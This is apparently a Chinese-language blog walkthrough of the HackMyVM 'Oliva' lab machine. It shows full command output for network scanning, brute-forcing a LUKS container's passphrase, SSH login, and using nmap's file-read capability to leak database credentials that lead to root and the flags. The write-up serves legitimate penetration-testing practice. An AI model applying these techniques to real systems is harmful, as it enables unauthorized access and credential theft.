---
{"dg-publish":true,"title":"hackmyvm_Oliva","tags":["blog"],"dg-path":"安全/靶机/hackmyvm_Oliva.md","permalink":"/安全/靶机/hackmyvm_Oliva/","dgPassFrontmatter":true}
---

# 主机发现

```sh
┌──(root㉿kali)-[~]
└─# arp-scan --interface=eth0 --localnet
Interface: eth0, type: EN10MB, MAC: 00:0c:29:8e:b5:fe, IPv4: 192.168.4.4
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.4.1     00:50:56:c0:00:08       VMware, Inc.
192.168.4.2     00:50:56:e9:2d:a9       VMware, Inc.
192.168.4.3     08:00:27:54:0d:38       PCS Systemtechnik GmbH
192.168.4.254   00:50:56:e4:06:4b       VMware, Inc.

153 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.352 seconds (108.84 hosts/sec). 4 responded


┌──(root㉿kali)-[~/workspace/pentest/Oliva]
└─# nmap -sT -min-rate 10000 -p- 192.168.4.3
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-15 01:02 EST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.4.3
Host is up (0.0084s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:54:0D:38 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 77.48 seconds


```

开了22和80端口

```sh
┌──(root㉿kali)-[~/workspace/pentest/Oliva]
└─# nmap -sT -sC -sV -O -p22,80 192.168.4.3
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-15 01:04 EST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.4.3
Host is up (0.0022s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey:
|   256 6d:84:71:14:03:7d:7e:c8:6f:dd:24:92:a8:8e:f7:e9 (ECDSA)
|_  256 d8:5e:39:87:9e:a1:a6:75:9a:28:78:ce:84:f7:05:7a (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Did not follow redirect to http://58.20.19.47
MAC Address: 08:00:27:54:0D:38 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.02 seconds

```



# 初步渗透
目录扫描

```sh
┌──(root㉿kali)-[~]
└─# dirb http://192.168.4.3/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sat Feb 15 02:06:03 2025
URL_BASE: http://192.168.4.3/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.4.3/ ----
+ http://192.168.4.3/index.html (CODE:200|SIZE:615)
+ http://192.168.4.3/index.php (CODE:200|SIZE:69)

-----------------
END_TIME: Sat Feb 15 02:06:21 2025
DOWNLOADED: 4612 - FOUND: 2

```

```sh
┌──(root㉿kali)-[~]
└─# curl http://192.168.4.3/index.php
Hi oliva,
Here the pass to obtain root:


<a href="oliva">CLICK!</a>

```

我们下载一下看一下


```sh
┌──(root㉿kali)-[~/workspace/pentest/Oliva]
└─# file oliva
oliva: LUKS encrypted file, ver 2, header size 16384, ID 3, algo sha256, salt 0x14fa423af24634e8..., UUID: 9a391896-2dd5-4f2c-84cf-1ba6e4e0577e, crc 0x6118d2d9b595355f..., at 0x1000 {"keyslots":{"0":{"type":"luks2","key_size":64,"af":{"type":"luks1","stripes":4000,"hash":"sha256"},"area":{"type":"raw","offse
```
是一个 **LUKS 加密文件容器（LUKS2）**
```sh
┌──(root㉿kali)-[~/workspace/pentest/Oliva]
└─# cryptsetup luksOpen ./oliva mycontainer
Enter passphrase for ./oliva:
```
emmm，需要密码
尝试破解一下
```sh
┌──(root㉿kali)-[~/workspace/pentest/Oliva]
└─# cryptsetup luksHeaderBackup ./oliva --header-backup-file=oliva_header_backup

┌──(root㉿kali)-[~/workspace/pentest/Oliva]
└─# ls
oliva  oliva_header_backup

┌──(root㉿kali)-[~/workspace/pentest/Oliva]
└─# bruteforce-luks -t 4 -f wordlist oliva
Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.

Tried passwords: 0
Tried passwords per second: 0.000000
Last tried password: bebita

Password found: bebita

```
得到密码
```txt
bebita
```

```sh
┌──(root㉿kali)-[~/workspace/pentest/Oliva]
└─# cryptsetup luksOpen ./oliva mycontainer
Enter passphrase for ./oliva:

┌──(root㉿kali)-[~/workspace/pentest/Oliva]
└─# ls /dev/mapper
control  mycontainer

┌──(root㉿kali)-[~/workspace/pentest/Oliva]
└─# cd /mnt

┌──(root㉿kali)-[/mnt]
└─# ls
lost+found  mypass.txt

┌──(root㉿kali)-[/mnt]
└─# cat mypass.txt
Yesthatsmypass!

```


利用密码登录
```sh
┌──(root㉿kali)-[~/workspace/pentest/Oliva]
└─# ssh oliva@192.168.4.3
oliva@192.168.4.3's password:
Linux oliva 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jul  4 10:27:00 2023 from 192.168.0.100
oliva@oliva:~$ id
uid=1000(oliva) gid=1000(oliva) grupos=1000(oliva),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
oliva@oliva:~$ cat user.txt
HMVY0H8NgGJqbFzbgo0VMRm

```


# 提权

```sh
oliva@oliva:/var/backups$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/nmap cap_dac_read_search=eip
/usr/bin/ping cap_net_raw=ep
```
nmap具有任意文件读取的权限
```sh
oliva@oliva:/var/www/html$ nmap -iL index.php
Starting Nmap 7.93 ( https://nmap.org ) at 2025-02-15 09:31 CET
Failed to resolve "Hi".
Failed to resolve "oliva,".
Failed to resolve "Here".
Failed to resolve "the".
Failed to resolve "pass".
Failed to resolve "to".
Failed to resolve "obtain".
Failed to resolve "root:".
Failed to resolve "<?php".
Failed to resolve "$dbname".
Failed to resolve "=".
Failed to resolve "'easy';".
Failed to resolve "$dbuser".
Failed to resolve "=".
Failed to resolve "'root';".
Failed to resolve "$dbpass".
Failed to resolve "=".
Failed to resolve "'Savingmypass';".
Failed to resolve "$dbhost".
Failed to resolve "=".
Failed to resolve "'localhost';".
Failed to resolve "?>".
Failed to resolve "<a".
Unable to split netmask from target expression: "href="oliva">CLICK!</a>"
WARNING: No targets were specified, so 0 hosts scanned.
Nmap done: 0 IP addresses (0 hosts up) scanned in 66.25 seconds

```

得到数据库的用户名密码
```txt
root/Savingmypass
```

查看数据库：
```sh
oliva@oliva:/var/www/html$ mysql -u root -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 8
Server version: 10.11.3-MariaDB-1 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| easy               |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0,047 sec)

MariaDB [(none)]> use easy;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [easy]> show tables;
+----------------+
| Tables_in_easy |
+----------------+
| logging        |
+----------------+
1 row in set (0,000 sec)

MariaDB [easy]> select * from logging;
+--------+------+--------------+
| id_log | uzer | pazz         |
+--------+------+--------------+
|      1 | root | OhItwasEasy! |
+--------+------+--------------+
1 row in set (0,089 sec)

```
得到用户名密码
```txt
root/OhItwasEasy!
```


```sh
oliva@oliva:/var/www/html$ su
Contraseña:
root@oliva:/var/www/html# id
uid=0(root) gid=0(root) grupos=0(root)
root@oliva:/var/www/html# cd ~
root@oliva:~# ls
rutflag.txt
root@oliva:~# cat rutflag.txt
HMVnuTkm4MwFQNPmMJHRyW7
```
